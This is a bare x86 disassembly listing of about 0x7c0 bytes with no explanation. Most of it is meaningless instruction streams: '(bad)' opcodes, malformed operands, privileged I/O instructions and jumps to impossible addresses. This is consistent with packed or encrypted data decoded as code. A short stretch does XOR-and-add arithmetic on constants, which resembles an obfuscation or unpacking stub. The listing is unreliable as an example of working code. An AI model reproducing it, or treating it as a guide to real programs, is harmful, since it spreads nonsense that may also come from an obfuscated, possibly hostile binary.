  40d3cc:	sub    eax,0x5a5bba5c
  40d3d1:	ss push ebp
  40d3d3:	adc    DWORD PTR [eax-0x78],ebp
  40d3d6:	fiadd  DWORD PTR [edi-0x26f6c0b1]
  40d3dc:	inc    ebx
  40d3dd:	scas   eax,DWORD PTR es:[edi]
  40d3de:	dec    ebx
  40d3df:	loopne 0x40d3f0
  40d3e1:	pop    es
  40d3e2:	push   0x2c5db589
  40d3e7:	jp     0x40d3de
  40d3e9:	mov    dh,BYTE PTR [edi]
  40d3eb:	call   0x811d96fc
  40d3f0:	pop    ecx
  40d3f1:	aas    
  40d3f2:	and    ebp,DWORD PTR [esi+0x748b0208]
  40d3f8:	mov    WORD PTR [edi-0x6da3c386],fs
  40d3fe:	or     al,0x18
  40d400:	(bad)  
  40d401:	dec    eax
  40d402:	jb     0x40d464
  40d404:	adc    al,0x0
  40d406:	das    
  40d407:	or     DWORD PTR [edx],ebx
  40d409:	mov    ebx,0xb91bb65c
  40d40e:	push   esp
  40d40f:	push   edi
  40d410:	push   ds
  40d411:	das    
  40d412:	inc    ebp
  40d413:	fdivr  QWORD PTR [edx+ecx*2-0x6f]
  40d417:	xor    al,0x91
  40d419:	ss sub al,0x8c
  40d41c:	nop
  40d41d:	fidiv  DWORD PTR [esi+eiz*2-0x78]
  40d421:	sti    
  40d422:	mov    bh,0xa0
  40d424:	push   0x82ec28fd
  40d429:	mov    ah,BYTE PTR [ecx+0x79]
  40d42c:	push   0xc702663a
  40d431:	push   es
  40d432:	ds and eax,0x1de202f5
  40d438:	cmc    
  40d439:	iret   
  40d43a:	lock jp 0x40d3cd
  40d43d:	test   al,0xf4
  40d43f:	mov    bl,0x9c
  40d441:	xchg   edx,eax
  40d442:	sub    DWORD PTR [ebp-0x6ece9c0],esi
  40d448:	pop    ebp
  40d449:	cli    
  40d44a:	xchg   edi,eax
  40d44b:	iret   
  40d44c:	fwait
  40d44d:	test   BYTE PTR [ebx+0x1128fb25],dh
  40d453:	sar    BYTE PTR [ebp+eiz*8-0x2b360826],0x8f
  40d45b:	mov    bh,0x60
  40d45d:	test   dl,bh
  40d45f:	fnstsw WORD PTR [edi-0x76]
  40d462:	sar    DWORD PTR [ebx+0x72],1
  40d465:	pop    es
  40d466:	lds    eax,FWORD PTR [edi-0x3f]
  40d469:	lods   al,BYTE PTR ds:[esi]
  40d46a:	add    eax,0xcf955bbb
  40d46f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d470:	push   ebx
  40d471:	xor    al,0x82
  40d473:	jns    0x40d4ec
  40d475:	fbld   TBYTE PTR [edi]
  40d477:	xor    BYTE PTR [eax+edi*8-0x2f17ca26],cl
  40d47e:	dec    esi
  40d47f:	(bad)  
  40d480:	cmc    
  40d481:	push   edx
  40d482:	jns    0x40d41a
  40d484:	add    al,bh
  40d486:	sar    DWORD PTR [edi-0x1340644f],0xf2
  40d48d:	xor    al,0x28
  40d48f:	mov    esp,0xf1f11679
  40d494:	xor    DWORD PTR [ebx-0x2d],eax
  40d497:	dec    edi
  40d498:	fld    DWORD PTR [esi+0x1a030a1d]
  40d49e:	pop    ebx
  40d49f:	jno    0x40d43e
  40d4a1:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40d4a3:	dec    edx
  40d4a4:	mov    ch,0x3
  40d4a6:	jg     0x40d47a
  40d4a8:	inc    ecx
  40d4a9:	inc    edx
  40d4aa:	mov    esi,0x4a76cf66
  40d4af:	addr16 mov dl,0x23
  40d4b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4b3:	push   ebx
  40d4b4:	push   esi
  40d4b5:	xchg   edx,eax
  40d4b6:	push   0x8f514f21
  40d4bb:	data16 adc al,0x9e
  40d4be:	mov    BYTE PTR [edi-0x47],ah
  40d4c1:	add    eax,0x7ccb0ef2
  40d4c6:	fld    DWORD PTR [ecx]
  40d4c8:	imul   ecx,DWORD PTR [eax-0x54],0x9335161a
  40d4cf:	push   0x5d90e943
  40d4d4:	inc    esi
  40d4d5:	sbb    eax,0x6c25e78f
  40d4da:	imul   eax,DWORD PTR [eax+eiz*4+0x69],0x74
  40d4df:	int    0xd5
  40d4e1:	iret   
  40d4e2:	into   
  40d4e3:	(bad)  
  40d4e4:	adc    al,0x34
  40d4e6:	pop    ss
  40d4e7:	loopne 0x40d4a7
  40d4e9:	mov    ds:0xb91a5e5d,al
  40d4ee:	std    
  40d4ef:	pop    ebp
  40d4f0:	xchg   edi,eax
  40d4f1:	fisttp WORD PTR [edx+0x2b105ec5]
  40d4f7:	stc    
  40d4f8:	enter  0xd43f,0xf4
  40d4fc:	ficomp WORD PTR [ebx]
  40d4fe:	shl    BYTE PTR [eax],cl
  40d500:	mov    esp,0xcce64003
  40d505:	inc    edi
  40d506:	ja     0x40d4db
  40d508:	add    BYTE PTR [esi],ah
  40d50a:	jg     0x40d4b8
  40d50c:	add    DWORD PTR [ecx-0x2e],eax
  40d50f:	pop    edi
  40d510:	outs   dx,DWORD PTR ds:[esi]
  40d511:	sbb    eax,0x832e30cc
  40d516:	mov    ecx,0xb89e0123
  40d51b:	imul   ebx,edi,0x5ed1fd80
  40d521:	nop
  40d522:	adc    DWORD PTR [edx+0xf],esi
  40d525:	sub    BYTE PTR [edx],dh
  40d527:	add    BYTE PTR [ebx+0xd083b28],bh
  40d52d:	push   ebx
  40d52e:	cs pop ecx
  40d530:	jg     0x40d4be
  40d532:	lea    edx,[ecx-0x3abd83e0]
  40d538:	jnp    0x40d534
  40d53a:	jecxz  0x40d571
  40d53c:	mov    edi,0x9ce6af5
  40d541:	mov    esi,0x84f8c47e
  40d546:	dec    esi
  40d547:	push   ebx
  40d548:	jns    0x40d5b2
  40d54a:	outs   dx,DWORD PTR ds:[esi]
  40d54b:	call   0x802d042c
  40d550:	aaa    
  40d551:	in     al,dx
  40d552:	mov    ebp,0xd0863cbe
  40d557:	dec    edi
  40d558:	push   ss
  40d559:	popf   
  40d55a:	call   DWORD PTR [edi+0x347ec5fe]
  40d560:	scas   al,BYTE PTR es:[edi]
  40d561:	lods   eax,DWORD PTR ds:[esi]
  40d562:	push   cs
  40d563:	sbb    BYTE PTR [esi+eax*2+0x48922fa8],dl
  40d56a:	imul   ebp,DWORD PTR [ebx+edi*1],0x51
  40d56e:	jo     0x40d5ba
  40d570:	push   ebx
  40d571:	ds (bad) 
  40d573:	mov    bh,0xbd
  40d575:	pop    ss
  40d576:	push   ebp
  40d577:	or     ebp,ebx
  40d579:	add    ecx,DWORD PTR [esi+0x3c5943dd]
  40d57f:	xchg   edi,eax
  40d580:	add    al,0xf3
  40d582:	and    eax,0xf6297e64
  40d587:	pop    ss
  40d588:	nop
  40d589:	lahf   
  40d58a:	fst    st(1)
  40d58c:	dec    edi
  40d58d:	and    bl,BYTE PTR [ebx+ebp*8-0x7]
  40d591:	test   BYTE PTR [eax-0x2a],dl
  40d594:	inc    esp
  40d595:	retf   0x6ab
  40d598:	xlat   BYTE PTR ds:[ebx]
  40d599:	sub    dl,al
  40d59b:	(bad)  
  40d59c:	fwait
  40d59d:	pop    edi
  40d59e:	sub    BYTE PTR [ebp+0x7e3ec5be],0xa0
  40d5a5:	cmp    al,0x5c
  40d5a7:	icebp  
  40d5a8:	ins    BYTE PTR es:[di],dx
  40d5aa:	xchg   BYTE PTR [edx],cl
  40d5ac:	mov    esi,0x221c3917
  40d5b1:	outs   dx,BYTE PTR ds:[esi]
  40d5b2:	out    0x53,eax
  40d5b4:	scas   al,BYTE PTR es:[edi]
  40d5b5:	mov    cs,WORD PTR [ebp-0x58]
  40d5b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5b9:	xchg   esp,eax
  40d5ba:	aas    
  40d5bb:	cmp    eax,0xc9f8c43
  40d5c0:	mov    dl,0xa7
  40d5c2:	das    
  40d5c3:	stos   DWORD PTR es:[edi],eax
  40d5c4:	pop    ecx
  40d5c5:	sub    ebx,DWORD PTR [bx+di-0x12dd]
  40d5ca:	outs   dx,DWORD PTR ds:[esi]
  40d5cb:	adc    eax,0x49
  40d5ce:	popa   
  40d5cf:	leave  
  40d5d0:	fiadd  DWORD PTR [ebp-0x6b]
  40d5d3:	push   ds
  40d5d4:	and    ecx,DWORD PTR [eax]
  40d5d6:	(bad)  
  40d5d7:	push   ecx
  40d5d8:	pop    ds
  40d5d9:	dec    esi
  40d5da:	sbb    eax,ecx
  40d5dc:	mov    esi,0xaf0f69ec
  40d5e1:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d603
  40d62d:	out    0xb8,eax
  40d62f:	jp     0x40d65c
  40d631:	nop
  40d632:	jle    0x40d6b2
  40d634:	jge    0x40d6b3
  40d636:	jle    0x40d6b6
  40d638:	or     DWORD PTR [eax-0x7c],eax
  40d63b:	push   ecx
  40d63c:	lds    esp,FWORD PTR [edi-0x406e5244]
  40d642:	jbe    0x40d69e
  40d644:	xchg   eax,ebx
  40d646:	gs jmp 0xfe2a:0x601f4f97
  40d64e:	into   
  40d64f:	lods   al,BYTE PTR ds:[esi]
  40d650:	inc    ecx
  40d651:	pop    ds
  40d652:	retf   0x641f
  40d655:	les    edx,FWORD PTR [edi]
  40d657:	pop    edx
  40d658:	dec    ebx
  40d659:	int3   
  40d65a:	imul   edx,edx,0xa1336885
  40d660:	or     al,0x65
  40d662:	mov    eax,0x36a0667d
  40d667:	ror    ch,cl
  40d669:	xchg   ecx,eax
  40d66a:	push   DWORD PTR [esi+eax*4+0x17059173]
  40d671:	clc    
  40d672:	mov    ecx,0x2f3ab80b
  40d677:	jl     0x40d6b3
  40d679:	in     al,dx
  40d67a:	mov    ds:0xb383b25c,al
  40d67f:	scas   eax,DWORD PTR es:[edi]
  40d680:	ds jo  0x40d63c
  40d683:	sbb    DWORD PTR [edi],edx
  40d685:	push   es
  40d686:	rcr    BYTE PTR [ecx],0x8d
  40d689:	sahf   
  40d68a:	and    ch,BYTE PTR [edx]
  40d68c:	xor    eax,0x768c48ec
  40d691:	xor    edi,DWORD PTR [esi-0x2fc27cfa]
  40d697:	std    
  40d698:	mov    ecx,DWORD PTR [eax-0x34f1c89b]
  40d69e:	push   0x6e
  40d6a0:	jae    0x40d711
  40d6a2:	pop    es
  40d6a3:	rcr    al,0x23
  40d6a6:	cli    
  40d6a7:	cmp    BYTE PTR [eax-0x2f179efa],cl
  40d6ad:	jmp    0xf8b469
  40d6b2:	push   cs
  40d6b3:	sbb    eax,0x81f37504
  40d6b9:	jmp    0xaad2:0xe49f2d8c
  40d6c0:	lahf   
  40d6c1:	test   eax,0x3d599ab3
  40d6c6:	pusha  
  40d6c7:	std    
  40d6c8:	(bad)  
  40d6c9:	sbb    al,0x7a
  40d6cb:	sbb    al,0x84
  40d6cd:	call   0x83c3775f
  40d6d2:	or     bh,al
  40d6d4:	sub    esp,DWORD PTR [edi+0x31]
  40d6d7:	sbb    BYTE PTR [edx],0x5e
  40d6da:	adc    dh,cl
  40d6dc:	(bad)  [ebp+0x5ff3bbf3]
  40d6e2:	test   al,bl
  40d6e4:	add    al,0x4b
  40d6e6:	mov    ebp,eax
  40d6e8:	push   esp
  40d6e9:	mov    edi,0xf9ed68f5
  40d6ee:	retf   0xd1be
  40d6f1:	dec    edi
  40d6f2:	xchg   edi,eax
  40d6f3:	mov    esi,eax
  40d6f5:	arpl   bp,si
  40d6f7:	sub    bl,BYTE PTR [ecx-0x1a]
  40d6fa:	pop    es
  40d6fb:	mov    cl,0x8
  40d6fd:	fild   DWORD PTR [edx]
  40d6ff:	jp     0x40d6c1
  40d701:	jnp    0x40d71a
  40d703:	mov    ebx,DWORD PTR [edx+0x7b44157e]
  40d709:	sub    eax,0x5c9e3d42
  40d70e:	xor    al,0xdc
  40d710:	jno    0x40d72c
  40d712:	repnz out 0x9a,eax
  40d715:	sahf   
  40d716:	xchg   esp,eax
  40d717:	cmp    cl,al
  40d719:	outs   dx,BYTE PTR ds:[esi]
  40d71a:	stc    
  40d71b:	ins    DWORD PTR es:[edi],dx
  40d71c:	(bad)  
  40d71d:	xchg   edx,eax
  40d71e:	inc    esi
  40d71f:	dec    ecx
  40d720:	out    dx,eax
  40d721:	popa   
  40d722:	xchg   ecx,eax
  40d723:	xchg   ecx,eax
  40d724:	jmp    0x9a470cf9
  40d729:	xchg   esp,edi
  40d72b:	xlat   BYTE PTR ds:[ebx]
  40d72c:	std    
  40d72d:	mov    esp,0x81e52409
  40d732:	inc    eax
  40d733:	add    al,0x39
  40d735:	add    DWORD PTR [edi],0x15110f47
  40d73b:	ins    DWORD PTR es:[edi],dx
  40d73c:	jb     0x40d71b
  40d73e:	sti    
  40d73f:	ficom  WORD PTR [edx-0x1bca585c]
  40d745:	sbb    BYTE PTR [esi-0x228621f],bl
  40d74b:	inc    DWORD PTR [ebx+0x56e8f242]
  40d751:	sbb    ch,BYTE PTR [eax+ecx*2-0x32ff624f]
  40d758:	push   esp
  40d759:	inc    ebx
  40d75a:	int    0x9a
  40d75c:	mov    esp,es
  40d75e:	jl     0x40d78b
  40d760:	or     ecx,ebp
  40d762:	xchg   esi,eax
  40d763:	shl    BYTE PTR [ebp+ebp*8+0x5b9e951a],1
  40d76a:	enter  0x614f,0x79
  40d76e:	cld    
  40d76f:	mov    dl,0x24
  40d771:	icebp  
  40d772:	pop    esi
  40d773:	test   DWORD PTR [esi-0x2c],esp
  40d776:	(bad)  
  40d777:	call   0xff2c1995
  40d77c:	xor    dl,BYTE PTR [eax-0x80]
  40d77f:	mov    cs,WORD PTR [edx]
  40d781:	leave  
  40d782:	stc    
  40d783:	and    DWORD PTR ds:0x3a8a25e5,edi
  40d789:	dec    edx
  40d78a:	cmp    BYTE PTR [eax+0x68],ch
  40d78d:	lock and eax,0xb61d826b
  40d793:	test   al,0x7c
  40d795:	js     0x40d751
  40d797:	jnp    0x40d797
  40d799:	jae    0x40d7ec
  40d79b:	xor    ecx,DWORD PTR [ebp-0x3baa8f15]
  40d7a1:	ret    
  40d7a2:	adc    al,0x9e
  40d7a4:	out    dx,al
  40d7a5:	push   0xe05a5748
  40d7aa:	mov    eax,0xa3e7aa32
  40d7af:	mov    dl,0x5a
  40d7b1:	imul   ebx,DWORD PTR [eax+0x2f840ce7],0x5028db52
  40d7bb:	pop    esi
  40d7bc:	sti    
  40d7bd:	fadd   st(0),st
  40d7bf:	ret    
  40d7c0:	mov    ebx,edi
  40d7c2:	pop    edx
  40d7c3:	or     ah,BYTE PTR [ecx]
  40d7c5:	fwait
  40d7c6:	dec    edx
  40d7c7:	imul   ebp,DWORD PTR [esi-0x5e],0xffffffc5
  40d7cb:	test   eax,0x8d466956
  40d7d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d1:	imul   esi,DWORD PTR [edi-0x11],0x46
  40d7d5:	xchg   esi,eax
  40d7d6:	fsub   QWORD PTR [ebp+0x17472179]
  40d7dc:	mov    ch,0x44
  40d7de:	xchg   esi,eax
  40d7df:	jecxz  0x40d827
  40d7e1:	call   0xce24:0xdb451405
  40d7e8:	test   al,0xd2
  40d7ea:	xor    al,bh
  40d7ec:	xor    eax,0x756d6a8a
  40d7f1:	sbb    al,0x92
  40d7f3:	jecxz  0x40d784
  40d7f5:	xor    al,cl
  40d7f7:	shl    DWORD PTR [esi+0x75],0x86
  40d7fb:	jmp    0x40d7d7
  40d7fd:	das    
  40d7fe:	adc    ch,ch
  40d800:	jbe    0x40d799
  40d802:	fcomp  DWORD PTR [esp+ebx*4-0x68]
  40d806:	dec    esp
  40d807:	imul   edi,DWORD PTR [ecx-0x3e],0x79d5caec
  40d80e:	cmp    bh,BYTE PTR [ecx]
  40d810:	ja     0x40d88a
  40d812:	push   esp
  40d813:	mov    eax,0x80b95e30
  40d818:	sbb    eax,0x74b83d2e
  40d81d:	dec    esp
  40d81e:	mov    al,0x8f
  40d820:	sub    eax,0x4d8220ed
  40d825:	push   esi
  40d826:	pusha  
  40d827:	push   eax
  40d828:	mov    ?,eax
  40d82a:	out    0x54,eax
  40d82c:	mov    eax,0xa66d10ae
  40d831:	xchg   BYTE PTR [edi+0x6b],cl
  40d834:	repnz pusha 
  40d836:	cmp    bh,dh
  40d838:	gs ds ds nop
  40d83c:	icebp  
  40d83d:	xor    dh,dh
  40d83f:	sub    dl,BYTE PTR [ebp+0x371d530e]
  40d845:	cld    
  40d846:	ins    BYTE PTR es:[edi],dx
  40d847:	or     al,0xd2
  40d849:	stos   BYTE PTR es:[edi],al
  40d84a:	dec    esp
  40d84b:	jmp    0x3e2f:0x86fe30f1
  40d852:	cmp    dh,bh
  40d854:	or     BYTE PTR [eax-0x45cfcda8],bl
  40d85a:	out    dx,eax
  40d85b:	lahf   
  40d85c:	stc    
  40d85d:	jne    0x40d86b
  40d85f:	adc    esi,ebp
  40d861:	sub    DWORD PTR ds:0xa686f61e,ebx
  40d867:	test   eax,0x9a817b90
  40d86c:	or     BYTE PTR [edi-0x7fdafb36],bh
  40d872:	sbb    BYTE PTR [edi-0x1783d82f],0x4a
  40d879:	push   ss
  40d87a:	aas    
  40d87b:	iret   
  40d87c:	shr    ch,1
  40d87e:	rcr    BYTE PTR [ecx],0xc9
  40d881:	xchg   ebx,eax
  40d882:	adc    bh,BYTE PTR [esi+0x13e72bde]
  40d888:	jecxz  0x40d853
  40d88a:	inc    ecx
  40d88b:	(bad)  
  40d88c:	fs dec ecx
  40d88e:	dec    eax
  40d88f:	icebp  
  40d890:	ror    DWORD PTR ds:0x2c0d54ac,1
  40d896:	adc    dh,BYTE PTR [ebx-0x2d7a45b1]
  40d89c:	gs cld 
  40d89e:	or     BYTE PTR [ebx-0x6b],ch
  40d8a1:	fwait
  40d8a2:	sub    dh,BYTE PTR [ecx-0x34]
  40d8a5:	adc    DWORD PTR [ebx],edx
  40d8a7:	stos   BYTE PTR es:[edi],al
  40d8a8:	and    BYTE PTR [ebp+edx*4-0x68621588],0x78
  40d8b0:	retf   
  40d8b1:	jmp    0xce27:0xd83ccebe
  40d8b8:	ss stos BYTE PTR es:[edi],al
  40d8ba:	(bad)  
  40d8bb:	jno    0x40d91d
  40d8bd:	pop    DWORD PTR [esi-0x4c]
  40d8c0:	call   0x8d6f:0x331c9570
  40d8c7:	int3   
  40d8c8:	shr    DWORD PTR [edx],0x4a
  40d8cb:	add    DWORD PTR ds:0x58359cd5,esi
  40d8d1:	cli    
  40d8d2:	(bad)  
  40d8d4:	mov    al,ds:0xe4f751d6
  40d8d9:	cld    
  40d8da:	aad    0x50
  40d8dc:	sub    cl,BYTE PTR [ebx-0x1c14cd01]
  40d8e2:	inc    ecx
  40d8e3:	nop
  40d8e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8e5:	loopne 0x40d8ec
  40d8e7:	mov    bh,0xde
  40d8e9:	add    ebp,DWORD PTR [ecx-0x7c]
  40d8ec:	jno    0x40d942
  40d8ee:	(bad)  
  40d8ef:	xor    eax,0xb5daa92e
  40d8f4:	mov    al,ds:0xdb417132
  40d8f9:	xchg   edx,eax
  40d8fa:	pop    ebp
  40d8fb:	xchg   edi,eax
  40d8fc:	inc    ebx
  40d8fd:	sub    BYTE PTR [eax],bh
  40d8ff:	dec    ebx
  40d900:	sub    eax,0xbce24ae2
  40d905:	outs   dx,DWORD PTR ds:[esi]
  40d906:	cdq    
  40d907:	add    cl,BYTE PTR [edx-0x26cd2d5c]
  40d90d:	push   0x87ee0939
  40d912:	shl    esp,cl
  40d914:	rcl    DWORD PTR [ebx+0x1110073d],cl
  40d91a:	sub    al,0x42
  40d91c:	fistp  DWORD PTR ds:0x26017f29
  40d922:	push   cs
  40d923:	stc    
  40d924:	lods   eax,DWORD PTR ds:[esi]
  40d925:	push   edi
  40d926:	xor    BYTE PTR [edi],dh
  40d928:	adc    ecx,DWORD PTR [edx]
  40d92a:	test   DWORD PTR [ebx+0x62],ebp
  40d92d:	jae    0x40d9a1
  40d92f:	rol    cl,1
  40d931:	jb     0x40d9af
  40d933:	mov    esi,0xc107fc1f
  40d938:	push   ss
  40d939:	outs   dx,DWORD PTR ds:[esi]
  40d93a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d93b:	xor    edx,ecx
  40d93d:	lea    eax,[edx+eax*1+0x32729b]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	addr16 xchg edi,eax
  40d957:	inc    esi
  40d958:	shl    DWORD PTR [esi],0x9f
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	mov    ecx,0xe3f44944
  40d966:	not    BYTE PTR ds:0x381a4718
  40d96c:	(bad)  
  40d96d:	stos   DWORD PTR es:[edi],eax
  40d96e:	inc    ecx
  40d96f:	arpl   WORD PTR ds:0x2750b8cf,sp
  40d975:	in     eax,0x66
  40d977:	xor    ch,0x3e
  40d97a:	aaa    
  40d97b:	mov    ds:0x7551cd14,eax
  40d980:	lea    ebx,[edi+0x42]
  40d983:	ret    
  40d984:	int    0x1f
  40d986:	adc    ebx,DWORD PTR [ecx+eax*2]
  40d989:	(bad)  
  40d98a:	mov    edx,0xa4f7677b
  40d98f:	aaa    
  40d990:	add    DWORD PTR [ecx],esi
  40d992:	pop    esp
  40d993:	leave  
  40d994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d995:	aad    0x91
  40d997:	aas    
  40d998:	gs out dx,eax
  40d99a:	mov    BYTE PTR [ecx-0x73f20ec],bl
  40d9a0:	aas    
  40d9a1:	dec    BYTE PTR [esi+eax*4-0x62]
  40d9a5:	imul   edi,DWORD PTR fs:[ecx-0x55620c4],0x37
  40d9ad:	pop    esp
  40d9ae:	(bad)  
  40d9af:	push   edi
  40d9b0:	mov    BYTE PTR [edx+0x69],al
  40d9b3:	add    eax,0xe239791f
  40d9b8:	data16 cli 
  40d9ba:	pop    ecx
  40d9bb:	push   edi
  40d9bc:	mov    ?,WORD PTR [eax+0x211d0a07]
  40d9c2:	js     0x40d985
  40d9c4:	iret   
  40d9c5:	xor    ah,BYTE PTR [edi+0xe797c49]
  40d9cb:	iret   
  40d9cc:	dec    eax
  40d9cd:	jg     0x40d9ae
  40d9cf:	xor    cl,BYTE PTR [ebp+0x68]
  40d9d2:	ds data16 add dh,dl
  40d9d6:	sub    bl,ch
  40d9d8:	ss xchg ebx,eax
  40d9da:	jnp    0x40da26
  40d9dc:	(bad)  
  40d9dd:	mov    al,0x9b
  40d9df:	pop    ebx
  40d9e0:	pop    es
  40d9e1:	jno    0x40d9ba
  40d9e3:	(bad)  
  40d9e4:	(bad)  
  40d9e5:	cmp    ecx,esi
  40d9e7:	push   ds
  40d9e8:	loope  0x40d98f
  40d9ea:	push   0x853b8f4d
  40d9ef:	aas    
  40d9f0:	fcom   DWORD PTR [eax]
  40d9f2:	jge    0x40d9fb
  40d9f4:	mov    esi,0xe57ba731
  40d9f9:	repz das 
  40d9fb:	fimul  WORD PTR [edi]
  40d9fd:	mov    bl,0x90
  40d9ff:	data16 hlt 
  40da01:	and    esi,ebp
  40da03:	outs   dx,BYTE PTR ds:[esi]
  40da04:	js     0x40da1f
  40da06:	in     al,dx
  40da07:	mov    bh,0x88
  40da09:	(bad)  
  40da0a:	test   eax,0x7117bed5
  40da0f:	and    dh,ch
  40da11:	loope  0x40da65
  40da13:	les    esp,FWORD PTR [edx+0x3afc175f]
  40da19:	or     eax,edx
  40da1b:	aas    
  40da1c:	push   eax
  40da1d:	call   0x6dee3985
  40da22:	stos   BYTE PTR es:[edi],al
  40da23:	mov    esp,0xbe9c4e90
  40da28:	sbb    BYTE PTR [edx-0x82271cf],0x71
  40da2f:	out    0x46,eax
  40da31:	mov    ecx,DWORD PTR [esi+0x65]
  40da34:	push   cs
  40da35:	es or  eax,ebp
  40da38:	scas   eax,DWORD PTR es:[edi]
  40da39:	and    al,BYTE PTR [ebp-0x2d]
  40da3c:	xor    eax,0xe73ed108
  40da41:	fwait
  40da42:	cmp    DWORD PTR [edi],edx
  40da44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da45:	loop   0x40d9ef
  40da47:	inc    ecx
  40da48:	pop    ds
  40da49:	or     DWORD PTR [eax-0x10],ebp
  40da4c:	dec    ebx
  40da4d:	bound  ebp,QWORD PTR [ecx-0x6dafd3c9]
  40da53:	pushf  
  40da54:	dec    ecx
  40da55:	fwait
  40da56:	test   eax,0xbfbb8720
  40da5b:	and    cl,BYTE PTR [ecx+0x4559fc38]
  40da61:	push   ss
  40da62:	bound  edx,QWORD PTR [ecx]
  40da64:	push   ebx
  40da65:	xchg   edx,eax
  40da66:	je     0x40da9e
  40da68:	shl    BYTE PTR [edi+0x61d1769e],1
  40da6e:	pop    ds
  40da6f:	cmp    eax,DWORD PTR [ecx+eiz*8-0x1aa20dbb]
  40da76:	fnstcw WORD PTR [ebp+eiz*1+0x722b8829]
  40da7d:	data16 lods al,BYTE PTR ds:[esi]
  40da7f:	cmp    DWORD PTR [ecx-0x42c22096],ecx
  40da85:	adc    DWORD PTR [ecx+eiz*4+0xc],edi
  40da89:	and    BYTE PTR [ebp-0x5d85df95],al
  40da8f:	add    al,0xa3
  40da91:	in     al,0x9f
  40da93:	mov    ds:0x66d9ab1c,eax
  40da98:	push   ebp
  40da99:	jbe    0x40da56
  40da9b:	mov    ecx,0x994eb3a1
  40daa0:	dec    esp
  40daa1:	inc    edi
  40daa2:	or     dh,BYTE PTR [ebx-0x7f3379c4]
  40daa8:	or     esi,esi
  40daaa:	xchg   edi,eax
  40daab:	out    0x25,al
  40daad:	pop    ebp
  40daae:	fstp   TBYTE PTR [ebx+eiz*4]
  40dab1:	mov    ebp,0xaf1b797a
  40dab6:	xor    DWORD PTR [eax-0x5bce21e6],edi
  40dabc:	ins    DWORD PTR es:[edi],dx
  40dabd:	lahf   
  40dabe:	mov    ds:0x3d971fa,eax
  40dac3:	adc    cl,BYTE PTR [ecx]
  40dac5:	add    bl,BYTE PTR [edi-0x4291d9f9]
  40dacb:	mov    bh,BYTE PTR [ebp-0x4a7ceee7]
  40dad1:	dec    edi
  40dad2:	(bad)
  40dad5:	(bad)  
  40dad6:	cdq    
  40dad7:	dec    eax
  40dad8:	xchg   edx,eax
  40dad9:	sub    DWORD PTR [esi+0x4c427d85],edx
  40dadf:	jg     0x40db3a
  40dae1:	sti    
  40dae2:	es call 0x2219:0x6b6fb598
  40daea:	or     al,0x5e
  40daec:	rol    esp,cl
  40daee:	das    
  40daef:	and    DWORD PTR [ebp-0x58],esi
  40daf2:	jl     0x40da96
  40daf4:	outs   dx,DWORD PTR ds:[esi]
  40daf5:	jl     0x40da96
  40daf7:	push   ebp
  40daf8:	or     ah,al
  40dafa:	sub    DWORD PTR [ebx+0x49923a92],esi
  40db00:	dec    ecx
  40db01:	nop
  40db02:	in     al,dx
  40db03:	push   cs
  40db04:	mov    dh,0x32
  40db06:	jbe    0x40dab6
  40db08:	sbb    cl,BYTE PTR [ebx+0x3115bd91]
  40db0e:	mov    ds:0x48e3bf3b,eax
  40db13:	icebp  
  40db14:	add    DWORD PTR [ebp+edx*4-0x7e2b8bee],eax
  40db1b:	jmp    0x40db17
  40db1d:	rcl    DWORD PTR [esi+ebx*2-0x6f9a36f3],0x7a
  40db25:	xchg   esp,eax
  40db26:	leave  
  40db27:	mov    ds:0x5d02c252,eax
  40db2c:	nop
  40db2d:	cdq    
  40db2e:	loop   0x40db8a
  40db30:	jmp    DWORD PTR [ebx]
  40db32:	cmc    
  40db33:	icebp  
  40db34:	mov    ecx,DWORD PTR [ecx+edi*4+0x7c3c9db0]
  40db3b:	add    DWORD PTR [edx-0x4b31b11a],0x6be14e52
  40db45:	(bad)  
  40db46:	sbb    DWORD PTR [eax+0x65],eax
  40db49:	call   0x7175:0xf58f994b
  40db50:	xor    al,0x6b
  40db52:	in     eax,dx
  40db53:	(bad)  
  40db54:	adc    dl,ah
  40db56:	enter  0x18f3,0x3e
  40db5a:	add    ch,dh
  40db5c:	inc    ebp
  40db5d:	or     ecx,DWORD PTR [esi+0x4a]
  40db60:	push   edi
  40db61:	dec    eax
  40db62:	inc    esp
  40db63:	inc    edi
  40db64:	dec    edx
  40db65:	adc    al,0x92
  40db68:	push   0x2f86827d
  40db6d:	mov    bh,0xbb
  40db6f:	dec    edx
  40db70:	pop    ds
  40db71:	shl    DWORD PTR [esi+0x7fd9341],cl
  40db77:	push   ds
  40db78:	fmul   QWORD PTR [esi+0x2635ccb4]
  40db7e:	or     eax,0x78371e0f
  40db83:	imul   ecx,DWORD PTR [eax+0x6f],0xffffff9c
  40db87:	dec    eax
  40db88:	ins    BYTE PTR es:[edi],dx
